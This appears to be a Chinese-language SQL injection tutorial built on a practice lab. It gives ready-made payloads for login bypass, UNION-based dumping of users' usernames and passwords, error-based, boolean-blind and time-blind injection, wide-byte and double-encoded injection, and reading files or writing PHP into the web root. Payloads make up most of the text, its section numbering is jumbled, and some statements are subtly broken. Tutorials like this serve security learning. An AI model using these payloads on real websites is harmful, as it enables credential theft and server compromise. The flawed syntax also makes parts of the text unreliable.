2.使用原理

通过mysql数据库的命令来实现的

当输入账号和密码后通过select * from 命令来查询user表中是否有输入的账号密码，如果有就会返回登录成功

没有就会返回登录失败

正好常的php源码

select * from user where username= 'admin' and password= '123456'

将万能密码放入用户名输入框代码会变为

输入的账号为空则值为假,但是1=1恒为真，or的意思是当一个为真那么另一个也为真 ，跟一个“#”号是注释符

在mysql执行的命令会变为select * from user(查询user表中的所有信息)。有返回信息则成功

select * from user where username= ''or 1=1 # and password= '123456'

三：sql注入联合查询

1.判断是否有注入点和注入类型

单引号判断是否有注入点，如果页面返回错误，则可能存在 Sql 注入。

原因是无论字符型还是整型都会因为单引号个数不匹配而报错

如下字符型代码

$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";

当$id=1’时则代码会返回

$sql="SELECT * FROM users WHERE id='1’' LIMIT 0,1";

数字型代码如下

$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";

当$id=1’时则代码会返回

$sql="SELECT * FROM users WHERE id=1' LIMIT 0,1";

如何区分是字符型和数字型

数字型测试方法；

and 1=1 最经典的测试方法

当是数字形式执行代码如下

$sql="SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1";

页面正常运行

and 1=2 时代码运行如下

$sql="SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1";

1=2不成立运行错误

可判断该类型为数字型

同理如果将and 1=1 带入到字符型中就会出现如下情况

代码运行如下

$sql="SELECT * FROM users WHERE id=‘1 and 1=1’ LIMIT 0,1";

不会产生逻辑判断所以不管是and 1=1 或and 1=2都会显示正常，所以也可以根据这种情况来进行判断

字符型测试方法；

and ‘1’=’1来进行判断

后台运行代码为

$sql="SELECT * FROM users WHERE id=‘1 and ’1’=‘1’ LIMIT 0,1";

则页面运行正常

and ‘1’=’2 时代码执行如下

$sql="SELECT * FROM users WHERE id=‘1 and ’1’=‘2’ LIMIT 0,1";

1=2不成立运行错误

可判断该类型为字符型

通过靶场来测

输入单引号后出现报错

报错信息

'1'' LIMIT 0,1

判断该类型为字符型注入

利用order by 来判断字段数

从1递曾测试，当输入4时出现回显报错，说明字段数为3

3.联合查询

利用union select 联合查询数据库中的数据

利用mysql数据库命令select database()命令查询当前所在的数据库

'union select 1,2,3 %23   //%23 为#

利用mysql自带库information_schema查询security数据库的表名，information_schema数据库为mysql5.7以上版本带有的默认数据库。

0' union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1%23

1.table_name字段保存着数据库中所有的表的信息.

2.来自数据库information_schema中的tables表

3.位置在table_schema字段下的security的数据库

4.通过limit命令依次输出表

利用mysql自带库information_schema查询security数据库中users表中的字段

1.column_name字段中存有所有数据库的字段

2.来自数据库information_schema中的columns的表

' union select 1,column_name,3 frominformation_schema.columns where table_schema=database() and table_name='users' limit 1,1%23

查询username,password的值 ，来自sencurity数据库中的users表

' union select 1,username,password from security.users limit 1,1%23

到这一步就完成了(get)字符型的注入

补充常用函数

Concat()    //：将多个字符串链接成一个字符串
Concat_ws()和concat()一样   //：将多个字符串链接成一个字符串，但可以指定分隔符
Group_concat()		//：将多行结果连接成一组

四：报错注入

extractvalue()函数

extractvalue(1,2)				//接受两个参数
payload构建
'and extractvalue(1,concat(0x7e,database()))#

updatexml()函数

updatexml(1,2,3)					//接受三个参数
payload构建
' and updatexml(1,concat(0x7e,database()),3)#

五：布尔盲注

substr()函数

substr(1,2,3)   		//截取数据库某一列字段中的一部分

length()函数

length(database())			//获取当前数据库名的长度

ascii()函数

ascii(length(database()))			//将数据库名的长度转为ascii码

构建payload

' and length(database())>7 #             //判断数据库名的长度 查询的值为真
'and ascii(substr(database()，0，1))>115			//判断数据库名的第一个字母

五：时间盲注

sleep()函数

sleep(5)				//延时5秒响应

if()函数

if(1,2,3)						//三个参数进行条件判断

构建payload

' and sleep(5)#				//查看是否有注入点，带入的参数为真
' and if(length(database())>7,sleep(5),0)		//如果数据库名的长度大于7，则延迟5秒响应
' and if(ascii(substr(database(),0,1))>115,sleep(5),0)		//判断数据库名的第一个字母

六：宽字节注入

原理

构建payload

%81 - %fe								//之间的数都可以进行利用
%81' and 1=1 #

七：二次编码注入

原理

构建payload

%2527				//单引号url两次编码后的值
%2527 and 1=1 %23

后续通过联合注入的方式进行注入

payload构造的每个语句的单引号都要通过二次编码才能生效

二：sql注入读写文件

payload构建

' union select 1,2,load_file('/var/www/1.txt')		//读取文件
' union select 1,2,'<?php phpinfo() ?>' into outfile '/var/www/html'	//写入文件
' union select 1,2,'<?php phpinfo() ?>' into dumpfile '/var/www/html'	//写入文件
